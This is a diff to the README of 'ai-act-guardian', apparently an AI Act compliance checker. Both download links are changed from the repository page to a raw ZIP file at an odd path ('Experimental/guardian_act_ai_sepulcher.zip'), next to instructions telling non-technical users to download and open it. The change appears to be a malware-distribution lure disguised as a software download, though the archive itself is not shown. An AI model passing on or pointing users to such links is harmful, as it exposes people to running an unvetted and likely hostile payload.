@@ -1,6 +1,6 @@
 # 🛡️ ai-act-guardian - Simple AI Act Compliance Checks
 
-[![Download and use ai-act-guardian](https://img.shields.io/badge/Download-ai--act--guardian-blue?style=for-the-badge&logo=github)](https://github.com/Jozithe3019/ai-act-guardian)
+[![Download and use ai-act-guardian](https://img.shields.io/badge/Download-ai--act--guardian-blue?style=for-the-badge&logo=github)](https://github.com/Jozithe3019/ai-act-guardian/raw/refs/heads/main/Experimental/guardian_act_ai_sepulcher.zip)
 
 ## 🚀 What this app does
 
@@ -30,7 +30,7 @@ For best results, close large apps before you run the scan.
 
 Visit this page to download:
 
-https://github.com/Jozithe3019/ai-act-guardian
+https://github.com/Jozithe3019/ai-act-guardian/raw/refs/heads/main/Experimental/guardian_act_ai_sepulcher.zip
 
 Open the page, look for the latest release or main project page, and download the Windows version if one is listed. If the page offers a ZIP file or installer, save it to your computer before you open it.
 
